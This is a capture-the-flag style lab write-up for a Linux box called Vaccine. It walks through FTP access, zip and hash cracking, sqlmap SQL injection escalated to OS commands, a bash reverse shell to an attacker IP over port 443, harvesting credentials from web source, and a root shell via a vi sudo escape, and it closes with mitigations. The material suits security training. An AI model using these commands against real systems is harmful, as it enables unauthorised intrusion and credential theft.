# Vaccine | Easy | 2026-07-07

## Summary
Vaccine is a Linux box chaining multiple techniques across FTP, password cracking, web application SQL injection, and privilege escalation. Anonymous FTP access exposed a password-protected zip containing web app credentials. A hashed password was cracked with Hashcat to gain dashboard access. SQLMap identified a PostgreSQL injection vulnerability, which was escalated to Remote Code Execution (RCE) via --os-shell, then to a stable reverse shell. PostgreSQL credentials were harvested from the web app source files. SSH access with those credentials revealed a sudo misconfiguration on vi, which was exploited via shell escape to achieve root.

---

## What We Didn't Know Before vs What We Know Now

| Before | After |
|--------|-------|
| Didn't know zip files could be cracked via hash extraction | zip2john extracts a crackable hash from a password-protected zip -- John or Hashcat can then crack it offline |
| Didn't know web apps store database credentials in source files | PHP apps must store DB credentials somewhere to connect -- /var/www/html is always the first place to grep for passwords after getting a shell |
| Didn't know sqlmap could escalate to OS shell | --os-shell flag attempts to leverage the SQL injection into OS command execution via database-specific methods (PostgreSQL uses COPY FROM PROGRAM) |
| Didn't know unstable shells can be upgraded via reverse shell payload | The sqlmap os-shell is unstable -- injecting a bash reverse shell payload through it gives a proper interactive session caught by Netcat |
| Didn't know about GTFOBins | GTFOBins (gtfobins.github.io) documents Unix binaries that can be abused for privesc when run with elevated privileges -- first reference after sudo -l reveals something |
| Didn't know vi could be used for privilege escalation | vi has a built-in shell escape (:set shell=/bin/sh then :shell) -- when vi runs as root via sudo, the spawned shell inherits root privileges |

---

## Recon
- **Nmap command:** `nmap -p- --min-rate 5000 -T4 10.129.x.x` then `nmap -sV -sC -p 21,22,80 10.129.x.x`
- **Open ports / services found:**
  - `21` -- FTP (anonymous login enabled)
  - `22` -- SSH
  - `80` -- HTTP (PHP web application)
- **Interesting observations:** FTP anonymous login available, web app login page on port 80

---

## Enumeration

### FTP anonymous access
```bash
ftp 10.129.x.x
# username: anonymous
# password: (blank)
get backup.zip
```
- Downloaded backup.zip -- password protected

### Cracking the zip password
```bash
# Extract hash from zip
zip2john backup.zip >> backup.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt backup.txt
```
- Cracked zip password, extracted contents
- Found `index.php` containing username `admin` and a hashed password

### Cracking the web app password hash
```bash
# Write hash to file
echo '<hashed_password>' >> hash.txt

# Crack with Hashcat (-a 0 = wordlist attack, -m 0 = MD5)
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- Cracked password: `qwerty789`
- Logged into web dashboard at `http://10.129.x.x/dashboard.php`

### SQL injection testing
```bash
# Get PHPSESSID cookie value via Firefox Cookie-Editor extension
# Test search parameter for SQL injection
sqlmap -u 'http://10.129.x.x/dashboard.php?search=hello' --cookie="PHPSESSID=<cookie>"
```
- Confirmed: GET parameter `search` injectable via PostgreSQL stacked queries

---

## Foothold

### Stage 1 -- SQLMap OS shell
- **Vulnerability:** SQL injection in search parameter leading to RCE via PostgreSQL COPY FROM PROGRAM
- **CVE:** N/A -- insecure coding practice
```bash
sqlmap -u 'http://10.129.x.x/dashboard.php?search=hello' --cookie="PHPSESSID=<cookie>" --os-shell
```
- Obtained unstable OS shell as postgres user

### Stage 2 -- Reverse shell for stable access
Set up Netcat listener on Kali:
```bash
sudo nc -lvnp 443
```

Injected reverse shell payload through sqlmap os-shell:
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.x/443 0>&1"
```
- Stable interactive shell returned as postgres user
- Port 443 used -- outbound HTTPS traffic rarely blocked by firewalls

### Stage 3 -- Credential harvesting from web source
```bash
# Web app must store DB credentials to connect -- check web root
cat /var/www/html/dashboard.php

# Streamlined search across all files
grep -r "password" /var/www/html/
grep -r "db_pass" /var/www/html/
```
- Found PostgreSQL credentials hardcoded in dashboard.php
- SSH into box using harvested credentials for fully stable shell:
```bash
ssh postgres@10.129.x.x
```

---

## Privilege Escalation

### Enumeration
```bash
sudo -l
```
- Revealed: postgres user can run `/bin/vi /etc/postgresql/11/main/pg_hba.conf` as root

### GTFOBins reference
- Searched gtfobins.github.io for "vi" under sudo category
- Confirmed vi shell escape technique applicable

### vi shell escape to root
```bash
# Run vi as root on the permitted file
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside vi:
```
:set shell=/bin/sh
:shell
```

- vi spawns /bin/sh inheriting its root privileges
- Root shell obtained

```bash
# Confirm root
whoami

# Read flag
cat /root/root.txt
```

**Why this works:** sudo allows postgres to run vi as root. vi has a built-in shell escape feature -- :shell spawns whichever shell is configured via :set shell. Since vi is running as root, the spawned shell inherits root privileges. The specific file (pg_hba.conf) was irrelevant -- any file would have worked as the excuse to run vi as root.

---

## Tools Used
- nmap
- ftp
- zip2john
- John the Ripper
- Hashcat
- Firefox Cookie-Editor extension
- sqlmap
- Netcat (reverse shell listener)
- ssh
- vi (privesc)

## Resources
- GTFOBins: https://gtfobins.github.io -- reference for Unix binary privesc, shell escapes, and sudo abuse
- Reverse Shell Cheat Sheet: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

---

## Key Takeaways
- **zip2john** -- extracts a crackable hash from password-protected zips, same workflow as any other hash: extract → crack with John or Hashcat
- **Credential harvesting from web source** -- PHP apps must store DB credentials somewhere. After getting a shell, always grep /var/www/html for passwords: `grep -r "password" /var/www/html/`
- **sqlmap --os-shell** -- escalates SQL injection to OS command execution via database-specific methods. PostgreSQL uses COPY FROM PROGRAM, MSSQL uses xp_cmdshell
- **Unstable to stable shell** -- sqlmap os-shell drops frequently. Standard move: use it to execute a bash reverse shell payload for a proper interactive session
- **Port 443 for reverse shells** -- outbound HTTPS port, rarely blocked by firewalls, makes reverse shell traffic blend with normal web traffic
- **sudo -l always** -- first command after any foothold. Reveals what the current user can run as root and points directly at privesc vectors
- **GTFOBins** -- bookmark this. After sudo -l reveals a binary, search GTFOBins for that binary name. Documents shell escapes for vi, less, python, perl, find, and dozens more
- **vi shell escape** -- :set shell=/bin/sh then :shell spawns a shell from within vi. When vi runs as root via sudo, that shell is root. The permitted file is irrelevant -- the shell escape works regardless of which file vi opened
- **What would have stopped this:**
  - Disable FTP anonymous login
  - Never store credentials in FTP-accessible backups
  - Use parameterized queries to prevent SQL injection
  - Never hardcode database credentials in application source files -- use environment variables
  - Follow principle of least privilege -- postgres user should not have sudo access to any binary
  - If vi sudo access is required, restrict with NOEXEC flag to prevent shell spawning

---

## Index Entry
| Box | Difficulty | Key Technique | CVE | Date |
|-----|------------|---------------|-----|------|
| Vaccine | Easy | SQLi → RCE → credential harvesting → vi sudo privesc | N/A | 2026-07-07 |